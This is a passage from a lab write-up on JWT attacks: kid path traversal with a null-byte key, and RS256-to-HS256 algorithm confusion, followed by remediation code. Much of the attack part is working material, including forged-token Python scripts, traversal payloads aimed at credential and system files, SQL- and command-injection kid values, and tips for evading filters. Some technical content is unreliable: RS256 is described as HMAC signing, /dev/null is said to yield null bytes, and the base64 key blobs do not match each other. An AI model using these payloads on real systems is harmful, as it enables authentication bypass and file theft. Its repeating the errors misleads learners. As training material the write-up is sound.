// Payload
{
  "sub": "wiener",
  "exp": 1709987656
}
```

**Phase 2: Symmetric Key Generation**

**4. Create Null-Byte Symmetric Key**
- Go to **JWT Editor Keys** tab
- Click "New Symmetric Key"
- Click "Generate" to create template
- Modify the key to use null byte as secret

**5. Replace k Property**
```json
{
  "kty": "oct",
  "kid": "null-key",
  "k": "AA=="
}
```

**Explanation:**
- `AA==` is Base64-encoded representation of a null byte (0x00)
- This matches the content of `/dev/null` on Linux systems
- When server reads `/dev/null`, it gets null bytes

**Base64 Encoding Reference:**
```bash
# Generate AA== (null byte)
echo -n $'\x00' | base64
# Output: AA==

# Verify
echo "AA==" | base64 -d | xxd
# Output: 00000000: 00
```

**Phase 3: Exploitation**

**6. Path Traversal Payload**
- In Repeater, modify request path to `/admin`
- Open **JSON Web Token** tab

**7. Modify JWT Header**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../dev/null"
}
```

**Path Traversal Variations:**
```
../../../../../../../dev/null
/dev/null
..//..//..//..//..//..//..//dev/null
....//....//....//....//dev/null
```

**8. Modify JWT Payload**
```json
{
  "sub": "administrator",
  "exp": 1709987656,
  "iat": 1709987000
}
```

**9. Sign with Null-Byte Key**
- Click "Sign" button
- Select your symmetric key (with k="AA==")
- Check "Don't modify header"
- Click "OK"

**10. Execute Attack**
```http
GET /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[forged-jwt]
```

**11. Complete Objective**
```http
GET /admin/delete?username=carlos HTTP/1.1
```

### Technical Deep Dive

**How the Attack Works:**

1. **Server's Key Loading Logic:**
```python
# Vulnerable server code
def load_signing_key(kid):
    key_path = f"/keys/{kid}"  # No sanitization!
    with open(key_path, 'rb') as f:
        return f.read()

def verify_jwt(token):
    header = decode_header(token)
    key = load_signing_key(header['kid'])  # Path traversal here
    return verify_signature(token, key)
```

2. **Path Traversal Execution:**
```
Intended: /keys/default-key-id
Attack:   /keys/../../../../../../../dev/null
Result:   /dev/null
```

3. **File Read Outcome:**
```python
# Reading /dev/null returns empty content (null bytes)
with open('/dev/null', 'rb') as f:
    key = f.read()  # Returns b'\x00' or empty

# Server uses this as HMAC secret
signature = hmac.new(b'\x00', message, sha256).digest()
```

4. **Attacker's Matching:**
```python
# Attacker signs with same null byte
secret = base64.b64decode('AA==')  # b'\x00'
signature = hmac.new(secret, message, sha256).digest()
# Signatures match!
```

### Alternative Exploitation Targets

**Technique 1: Empty Files**
```json
{"kid": "../../../../../../../proc/sys/kernel/randomize_va_space"}
```
- Many system files contain predictable content
- `/proc/sys/` files often contain single digits

**Technique 2: Known Configuration Files**
```json
{"kid": "../../../../../../../etc/hostname"}
```
- If hostname is known, can be used as secret

**Technique 3: SQL Injection via Kid**
```json
{"kid": "' OR '1'='1"}
```
- If kid is used in SQL query
- May return first key in database

**Technique 4: Command Injection**
```json
{"kid": "key'; cat /etc/passwd #"}
```
- If kid is used in shell command (rare but possible)

### Manual Exploitation (Python Script)

```python
import jwt
import base64
import requests

# Step 1: Create token with path traversal
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../../../../../dev/null"
}

payload = {
    "sub": "administrator",
    "exp": 1709987656
}

# Step 2: Sign with null byte secret
null_byte_secret = base64.b64decode('AA==')  # b'\x00'

# Step 3: Generate token
token = jwt.encode(
    payload,
    null_byte_secret,
    algorithm='HS256',
    headers=header
)

print(f"Forged JWT: {token}")

# Step 4: Use token
response = requests.get(
    'https://target.web-security-academy.net/admin',
    cookies={'session': token}
)

print(f"Status: {response.status_code}")
print(f"Response: {response.text}")
```

### Burp Suite Features Used
- **JWT Editor Extension**: Token manipulation
- **JWT Editor Keys**: Symmetric key generation
- **JSON Web Token Tab**: Header/payload modification
- **Repeater**: Attack testing
- **Decoder**: Base64 encoding verification

### Common Mistakes & Troubleshooting

**Issue 1: Wrong Base64 Encoding**
- **Symptom**: Signature mismatch
- **Solution**:
  - Ensure exact value: `AA==` (two A's, two equals)
  - Verify no extra whitespace
  - Test encoding: `echo -n $'\x00' | base64`

**Issue 2: Path Traversal Insufficient**
- **Symptom**: File not found error
- **Solution**:
  - Increase traversal depth: `../` repeated more times
  - Try absolute path: `/dev/null`
  - Check server OS (Windows uses different paths)

**Issue 3: Signature Still Invalid**
- **Symptom**: Token rejected despite correct path
- **Solution**:
  - Verify "Don't modify header" is checked when signing
  - Ensure kid parameter preserved exactly
  - Check algorithm matches (HS256)

**Issue 4: Different File System**
- **Symptom**: Attack fails on Windows server
- **Solution**:
  - Windows equivalent: `C:\Windows\System32\drivers\etc\hosts`
  - Or try: `../../../../../../../../../windows/win.ini`

**Issue 5: Empty vs Null Byte**
- **Symptom**: Some servers treat differently
- **Solution**:
  - Try empty string: `k: ""` (empty, not "AA==")
  - Test different encodings

### Platform-Specific Payloads

**Linux/Unix:**
```json
{"kid": "../../../../../../../dev/null"}          // Null bytes
{"kid": "../../../../../../../etc/hostname"}      // System hostname
{"kid": "../../../../../../../proc/version"}      // Kernel version
{"kid": "../../../../../../../proc/sys/kernel/osrelease"}  // OS info
```

**Windows:**
```json
{"kid": "..\\..\\..\\..\\..\\..\\windows\\win.ini"}
{"kid": "..\\..\\..\\..\\..\\..\\windows\\system.ini"}
{"kid": "C:\\windows\\win.ini"}
```

**Application Files:**
```json
{"kid": "../../../../../../app/config/keys/public.key"}
{"kid": "../../../../../../var/www/html/.env"}
```

### Security Impact
- **Severity**: HIGH
- **CWE**: CWE-22 (Path Traversal), CWE-73 (External Control of File Name)
- **Attack Complexity**: LOW
- **Additional Risks**:
  - Arbitrary file read (information disclosure)
  - Access to sensitive configuration
  - Potential for further exploitation

### Real-World Implications
This vulnerability can lead to:
- **Authentication bypass**: As demonstrated in lab
- **Source code disclosure**: Reading application files
- **Credential exposure**: Accessing config files
- **Key material theft**: Reading other JWT keys

### Remediation

**Vulnerable Code:**
```python
import hmac
import hashlib
import os

# VULNERABLE - Direct path concatenation
def load_key(kid):
    key_path = f"/app/keys/{kid}"  # NO VALIDATION
    with open(key_path, 'rb') as f:
        return f.read()

def verify_token(token):
    header = jwt.get_unverified_header(token)
    key = load_key(header['kid'])
    # ... verification logic
```

**Secure Code (Path Sanitization):**
```python
import hmac
import hashlib
import os
from pathlib import Path

# SECURE - Whitelist approach
ALLOWED_KEY_IDS = {
    'key-1': '/app/keys/key-1.pem',
    'key-2': '/app/keys/key-2.pem',
    'prod-key': '/app/keys/production.pem'
}

def load_key(kid):
    # Validate kid against whitelist
    if kid not in ALLOWED_KEY_IDS:
        raise ValueError("Invalid key ID")

    key_path = ALLOWED_KEY_IDS[kid]

    # Additional: Verify path is absolute and within allowed directory
    key_path = Path(key_path).resolve()
    allowed_dir = Path('/app/keys').resolve()

    if not str(key_path).startswith(str(allowed_dir)):
        raise ValueError("Key path outside allowed directory")

    with open(key_path, 'rb') as f:
        return f.read()

def verify_token(token):
    header = jwt.get_unverified_header(token)
    key = load_key(header['kid'])
    return jwt.verify(token, key, algorithms=['HS256', 'RS256'])
```

**Secure Code (Database Storage):**
```python
from database import get_db

# SECURE - Store keys in database, not filesystem
def load_key(kid):
    db = get_db()

    # Query with parameterized statement
    key = db.execute(
        "SELECT key_data FROM jwt_keys WHERE kid = ? AND active = 1",
        (kid,)
    ).fetchone()

    if not key:
        raise ValueError("Invalid key ID")

    return key['key_data']
```

**Security Controls:**

1. **Whitelist Validation:**
```python
ALLOWED_KIDS = ['key-1', 'key-2', 'prod-key']

if kid not in ALLOWED_KIDS:
    raise ValueError("Invalid kid")
```

2. **Path Sanitization:**
```python
# Remove directory traversal sequences
kid = kid.replace('../', '').replace('..\\', '')
kid = os.path.basename(kid)  # Only filename, no path
```

3. **Absolute Path Resolution:**
```python
from pathlib import Path

key_path = (Path('/app/keys') / kid).resolve()
if not str(key_path).startswith('/app/keys/'):
    raise ValueError("Path traversal detected")
```

4. **Input Validation:**
```python
import re

# Only allow alphanumeric and hyphens
if not re.match(r'^[a-zA-Z0-9\-_]+$', kid):
    raise ValueError("Invalid kid format")
```

5. **Avoid Filesystem Storage:**
- Store keys in database
- Use HSM (Hardware Security Module)
- Utilize key management services (AWS KMS, Azure Key Vault)

---

## Lab 7: JWT Authentication Bypass via Algorithm Confusion

### Difficulty
**PRACTITIONER**

### Vulnerability Description
The server uses RSA public/private key pairs for JWT signing (RS256 algorithm) but fails to properly validate the signing algorithm specified in the token header. This allows attackers to switch from asymmetric RSA (RS256) to symmetric HMAC (HS256), using the server's public key as the HMAC secret to forge valid signatures.

### Exploitation Technique

#### Attack Vector
- **Type**: Algorithm Confusion Attack
- **Impact**: Signature forgery using public key as HMAC secret
- **Prerequisites**: Access to server's public key, server accepts both RS256 and HS256

#### Step-by-Step Solution

**Phase 1: Public Key Acquisition**

**1. Install JWT Editor Extension**
- **Extender > BApp Store** > JWT Editor
- Restart Burp if necessary

**2. Initial Authentication**
```
Credentials: wiener:peter
```
- Log in and send `GET /my-account` to Repeater

**3. Discover JWKS Endpoint**
Navigate to the standard JWKS endpoint:
```http
GET /jwks.json HTTP/1.1
Host: [lab-id].web-security-academy.net
```

Or try alternative locations:
```
/.well-known/jwks.json
/api/jwks.json
/auth/jwks.json
/.well-known/openid-configuration
```

**4. Extract Public Key**
Response will contain JWK Set:
```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "prod-key-1",
      "alg": "RS256",
      "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw"
    }
  ]
}
```

**5. Copy Public Key Object**
Copy the entire key object from the `keys` array.

**Phase 2: Key Conversion**

**6. Import as RSA Key**
- Go to **JWT Editor Keys** tab
- Click "New RSA Key"
- Paste the copied JWK
- Click "OK" to save

**7. Export as PEM Format**
- Right-click the imported key
- Select "Copy Public Key as PEM"
- Save to clipboard

**PEM Format Example:**
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0vx7agoebGcQSuuPiLJX
ZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tS
oc/BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ/2W+5JsGY4Hc5n9yBXArwl93lqt
7/RN5w6Cf0h4QyQ5v+65YGjQR0/FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0
zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt+bFTWhAI4vMQFh6WeZu0f
M4lFd2NcRwr3XPksINHaQ+G/xBniIqbw0Ls1jF44+csFCur+kEgU8awapJzKnqDK
gwIDAQAB
-----END PUBLIC KEY-----
```

**8. Base64 Encode PEM**
- Go to **Decoder** tab
- Paste PEM format (including BEGIN/END lines)
- Encode as **Base64**

**Base64 Result:**
```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2eDdhZ29lYkdjUVN1dVBpTEpYClpwdE45bm5kclFtYlhFcHMyYWlBRmJXaE03OExoV3g0Y2JiZkFBdFZUODZ6d3UxUks3YVBGRnh1aERSMUw2dFMKb2MvQkpFQ1BlYldLUlhqQlpDaUZWNG4zb2tuamhNc3RuNjR0Wi8yVys1SnNHWTRIYzVuOXlCWEFyd2w5M2xxdAo3L1JONXc2Q2YwaDRReVE1dis2NVlHalFSMC9GRFcyUXZ6cVkzNjhRUU1pY0F0YVNxenM4S0paZ25ZYjljN2QwCnpnZEFaSHp1NnFNUXZSTDVoYWpybjFuOTFDYk9wYklTRDA4cU5MeXJka3QrYkZUV2hBSTR2TVFGADZXZVP1MGYKTTRsRmQyTmNSd3IzWFBrc0lOSGFRK0cveEJuaUlxYncwTHMxakY0NCtjc0ZDdXIra0VnVThhd2FwSnpLbnFESzpnd0lEQVFBQgotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0K
```

**9. Create Symmetric Key**
- Go to **JWT Editor Keys** tab
- Click "New Symmetric Key"
- Click "Generate" to create template
- Replace `k` property with Base64-encoded PEM:
```json
{
  "kty": "oct",
  "kid": "confusion-attack",
  "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2eDdhZ29lYkdjUVN1dVBpTEpYClpwdE45bm5kclFtYlhFcHMyYWlBRmJXaE03OExoV3g0Y2JiZkFBdFZUODZ6d3UxUks3YVBGRnh1aERSMUw2dFMKb2MvQkpFQ1BlYldLUlhqQlpDaUZWNG4zb2tuamhNc3RuNjR0Wi8yVys1SnNHWTRIYzVuOXlCWEFyd2w5M2xxdAo3L1JONXc2Q2YwaDRReVE1dis2NVlHalFSMC9GRFcyUXZ6cVkzNjhRUU1pY0F0YVNxenM4S0paZ25ZYjljN2QwCnpnZEFaSHp1NnFNUXZSTDVoYWpybjFuOTFDYk9wYklTRDA4cU5MeXJka3QrYkZUV2hBSTR2TVFGODZXZVP1MGYKTTRsRmQyTmNSd3IzWFBrc0lOSGFRK0cveEJuaUlxYncwTHMxakY0NCtjc0ZDdXIra0VnVThhd2FwSnpLbnFESzpnd0lEQVFBQgotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0K"
}
```

**Phase 3: Algorithm Confusion Attack**

**10. Modify JWT Header**
- In Repeater, select `/admin` request
- Open **JSON Web Token** tab
- Modify header - change algorithm from RS256 to HS256:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "prod-key-1"
}
```

**11. Modify JWT Payload**
```json
{
  "sub": "administrator",
  "exp": 1709987656,
  "iat": 1709987000
}
```

**12. Sign with Symmetric Key**
- Click "Sign" button
- Select the symmetric key containing Base64-encoded PEM
- Ensure "Don't modify header" is checked
- Click "OK"

**13. Execute Attack**
```http
GET /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[forged-jwt-with-hs256]
```

**14. Complete Objective**
```http
GET /admin/delete?username=carlos HTTP/1.1
```

### Technical Deep Dive

**How Algorithm Confusion Works:**

1. **Normal RS256 Flow:**
```
Sign:   HMAC-SHA256(message, PRIVATE_KEY) -> signature
Verify: HMAC-SHA256(message, PUBLIC_KEY)  -> verify signature
```

2. **Algorithm Confusion Flow:**
```
Server expects: RS256 (asymmetric)
Attacker sends: HS256 (symmetric)

Server's vulnerable logic:
- Reads alg: HS256 from token
- Switches to HMAC verification
- Uses PUBLIC_KEY (RSA) as HMAC secret
- Verifies signature

Attacker:
- Obtains PUBLIC_KEY
- Signs with HS256 using PUBLIC_KEY as secret
- Signatures match!
```

3. **Vulnerable Code Pattern:**
```python
def verify_jwt(token):
    header = jwt.get_unverified_header(token)
    algorithm = header['alg']  # Trusts user input!

    if algorithm == 'RS256':
        key = load_public_key()
    elif algorithm == 'HS256':
        key = load_secret_key()  # But what if this returns public key?

    return jwt.verify(token, key, algorithms=[algorithm])
```

4. **The Confusion:**
```python
# Server's incorrect key loading
def load_secret_key():
    # Developer thinks: "HMAC secrets are in this file"
    # Reality: File contains RSA public key in PEM format
    with open('/keys/public.pem', 'rb') as f:
        return f.read()  # Returns PEM-formatted public key

# Server uses PEM public key as HMAC secret
signature = hmac.new(PUBLIC_KEY_PEM, message, sha256)

# Attacker does the same
attacker_signature = hmac.new(PUBLIC_KEY_PEM, message, sha256)

# They match! Authentication bypassed.
```

### Manual Exploitation (Python Script)

```python
import jwt
import base64
import requests

# Step 1: Fetch public key from JWKS endpoint
response = requests.get('https://target.web-security-academy.net/jwks.json')
jwks = response.json()
public_jwk = jwks['keys'][0]

# Step 2: Convert JWK to PEM
from jwcrypto import jwk
key = jwk.JWK(**public_jwk)
public_pem = key.export_to_pem()

# Step 3: Base64 encode PEM (optional, for exact match)
pem_base64 = base64.b64encode(public_pem).decode()

# Step 4: Create malicious token with HS256
header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "sub": "administrator",
    "exp": 1709987656
}

# Step 5: Sign with public key as HMAC secret
token = jwt.encode(
    payload,
    public_pem,  # Using PUBLIC key as HMAC secret!
    algorithm='HS256',
    headers=header
)

print(f"Forged JWT: {token}")

# Step 6: Use token
response = requests.get(
    'https://target.web-security-academy.net/admin',
    cookies={'session': token}
)

print(f"Status: {response.status_code}")
```

### Alternative Techniques

**Technique 1: Without Base64 Encoding**
Sometimes the PEM itself (without Base64 encoding) works:
```json
{
  "kty": "oct",
  "k": "-----BEGIN PUBLIC KEY-----\nMIIBIj...\n-----END PUBLIC KEY-----"
}
```

**Technique 2: DER Format**
Convert PEM to DER binary format:
```bash
openssl rsa -pubin -in public.pem -outform DER -out public.der
base64 public.der
```

**Technique 3: Raw Modulus**
Use raw RSA modulus (n value from JWK) directly:
```python
n_bytes = base64.urlsafe_b64decode(jwk['n'] + '==')
secret = n_bytes
```

### Burp Suite Features Used
- **JWT Editor Extension**: Complete attack workflow
- **JWT Editor Keys**: Key conversion and management
- **JSON Web Token Tab**: Algorithm manipulation
- **Decoder**: Base64 encoding
- **Repeater**: Attack execution

### Common Mistakes & Troubleshooting

**Issue 1: PEM Format Incorrect**
- **Symptom**: Signature mismatch
- **Solution**:
  - Include BEGIN/END markers in Base64 encoding
  - Verify no extra whitespace or newlines
  - Check PEM export was successful

**Issue 2: Base64 Padding**
- **Symptom**: Invalid key format errors
- **Solution**:
  - Ensure proper Base64 padding (= characters)
  - Try without padding if it fails
  - Use standard Base64, not URL-safe variant

**Issue 3: Algorithm Not Changed**
- **Symptom**: Attack fails, still expects RS256
- **Solution**:
  - Verify header shows "alg": "HS256"
  - Check "Don't modify header" when signing
  - Ensure no auto-correction by tools

**Issue 4: Wrong Key Format**
- **Symptom**: Key import failures
- **Solution**:
  - Verify JWK has all required fields
  - Check kty value matches key type
  - Try alternative export formats

**Issue 5: Server Rejects HS256**
- **Symptom**: Algorithm not permitted error
- **Solution**:
  - Try other symmetric algorithms: HS384, HS512
  - Check if server has algorithm whitelist
  - Attempt case variations: hs256, Hs256

### Attack Variations

**Variation 1: Algorithm Downgrade**
```json
// From stronger to weaker
{"alg": "RS512"} -> {"alg": "RS256"} -> {"alg": "HS256"}
```

**Variation 2: Mixed Algorithm Attacks**
```json
{"alg": "PS256"}  // RSA-PSS
{"alg": "ES256"}  // ECDSA
```

**Variation 3: Header Injection**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "jwk": { ... }  // Combine with JWK injection
}
```

### Security Impact
- **Severity**: HIGH to CRITICAL
- **CWE**: CWE-327 (Broken Crypto), CWE-345 (Insufficient Verification)
- **Attack Complexity**: MEDIUM
- **Real-World Impact**:
  - Complete authentication bypass
  - Privilege escalation
  - Affects major frameworks

### Real-World Vulnerabilities
- **CVE-2015-9235**: Auth0 node-jsonwebtoken algorithm confusion
- **CVE-2016-10555**: Python PyJWT algorithm confusion
- **CVE-2016-5431**: Several Node.js libraries affected
- **Affected Libraries**: jsonwebtoken, jose, express-jwt, many others

### Remediation

**Vulnerable Code:**
```javascript
const jwt = require('jsonwebtoken');

// VULNERABLE - trusts algorithm from token
function verifyToken(token, publicKey) {
    const decoded = jwt.decode(token, {complete: true});
    const algorithm = decoded.header.alg;  // User-controlled!

    return jwt.verify(token, publicKey, {
        algorithms: [algorithm]  // Accepts any algorithm from token
    });
}
```

**Secure Code:**
```javascript
const jwt = require('jsonwebtoken');

// SECURE - enforces expected algorithm
function verifyToken(token, publicKey) {
    // Explicitly specify allowed algorithms
    return jwt.verify(token, publicKey, {
        algorithms: ['RS256']  // Strict whitelist, ignores token's alg claim
    });
}
```

**Defense in Depth:**
```javascript
const jwt = require('jsonwebtoken');

function verifyToken(token, keys) {
    const decoded = jwt.decode(token, {complete: true});

    // 1. Validate algorithm before verification
    const ALLOWED_ALGORITHMS = ['RS256', 'RS384', 'RS512'];
    if (!ALLOWED_ALGORITHMS.includes(decoded.header.alg)) {
        throw new Error('Algorithm not permitted');
    }

    // 2. Ensure algorithm class matches key type
    const tokenAlg = decoded.header.alg;
    const isAsymmetric = tokenAlg.startsWith('RS') || tokenAlg.startsWith('ES');

    if (isAsymmetric && typeof keys.publicKey === 'undefined') {
        throw new Error('Asymmetric algorithm requires public key');
    }

    // 3. Select appropriate key based on algorithm
    const key = isAsymmetric ? keys.publicKey : keys.secret;

    // 4. Verify with strict algorithm enforcement
    return jwt.verify(token, key, {
        algorithms: ALLOWED_ALGORITHMS,
        clockTolerance: 60,
        ignoreExpiration: false
    });
}
```

**Configuration-Based Security:**
```yaml
# config/jwt.yml
jwt:
  signing:
    algorithm: RS256
    key_type: asymmetric
    public_key_path: /keys/public.pem
    private_key_path: /keys/private.pem

  validation:
    strict_algorithm: true
    allowed_algorithms:
      - RS256
    reject_symmetric: true  # Never accept HS256/HS384/HS512
    require_expiration: true
    max_age_seconds: 3600
```

**Best Practices:**

1. **Algorithm Whitelist:**
```python
ALLOWED_ALGS = ['RS256']  # Strict whitelist

def verify(token, public_key):
    return jwt.decode(
        token,
        public_key,
        algorithms=ALLOWED_ALGS  # Enforced by library
    )
```

2. **Separate Key Storage:**
```python
RSA_PUBLIC_KEY = load_file('/keys/rsa_public.pem')
HMAC_SECRET = load_file('/secrets/hmac_secret.bin')

# Never use same file/variable for both
```

3. **Key Type Validation:**
```python
from cryptography.hazmat.primitives.asymmetric import rsa

def verify(token, key):
    decoded = jwt.decode(token, options={'verify_signature': False})
    alg = decoded['header']['alg']

    # Verify key type matches algorithm
    if alg.startswith('RS'):
        if not isinstance(key, rsa.RSAPublicKey):
            raise ValueError("Algorithm/key type mismatch")
```

4. **Reject Symmetric Algorithms Entirely:**
```javascript
// If you only use asymmetric signing
const ASYMMETRIC_ONLY = ['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512'];

jwt.verify(token, publicKey, {
    algorithms: ASYMMETRIC_ONLY
});
```

5. **Security Headers:**
```javascript
// Add additional validation in token
const payload = {
    sub: 'user123',
    alg_type: 'asymmetric',  // Additional claim
    key_type: 'RSA'
};

// Verify these claims match expectations
const decoded = jwt.verify(token, publicKey, {algorithms: ['RS256']});
if (decoded.alg_type !== 'asymmetric') {
    throw new Error('Invalid algorithm type claim');
}
```

---

## Summary of Attack Techniques

### Quick Reference Table

| Lab | Difficulty | Attack Type | Key Technique | Complexity |
|-----|-----------|-------------|---------------|-----------|
| 1. Unverified Signature | Apprentice | Missing Validation | Modify claims without re-signing | Very Low |
| 2. Flawed Verification | Apprentice | None Algorithm | Set alg=none, remove signature | Very Low |
| 3. Weak Signing Key | Practitioner | Brute Force | Crack weak HMAC secret | Low-Medium |
| 4. JWK Injection | Practitioner | Header Injection | Embed attacker's public key | Medium |
| 5. JKU Injection | Practitioner | SSRF + Injection | Remote key fetch from attacker URL | Medium |
| 6. Kid Path Traversal | Practitioner | Path Traversal | Point to /dev/null or known files | Medium |
| 7. Algorithm Confusion | Practitioner | Algorithm Substitution | Use public key as HMAC secret | Medium-High |

### Tool Usage Summary

**Required Tools:**
- **Burp Suite Professional**: All labs
- **JWT Editor Extension**: Labs 3-7
- **Hashcat**: Lab 3 (weak key brute-force)
- **Python/Node.js**: Alternative manual exploitation

**Optional Tools:**
- jwt_tool
- John the Ripper
- Custom scripts

### Common Patterns Across Labs

1. **Always start with authentication** (wiener:peter)
2. **Intercept and analyze JWT structure** in Burp
3. **Modify to target administrator access**
4. **Access `/admin` panel** as proof of compromise
5. **Delete carlos** user to complete objective

### Prevention Checklist

- [ ] Always verify JWT signatures
- [ ] Use strong, randomly generated secrets (32+ bytes)
- [ ] Enforce strict algorithm whitelisting
- [ ] Never trust header parameters (jwk, jku, kid)
- [ ] Validate kid against whitelist, sanitize for path traversal
- [ ] Reject "none" algorithm in all cases
- [ ] Use established JWT libraries with secure defaults
- [ ] Implement token expiration and rotation
- [ ] Store keys securely (HSM, key management services)
- [ ] Regular security audits of JWT implementation
- [ ] Monitor for anomalous token usage patterns
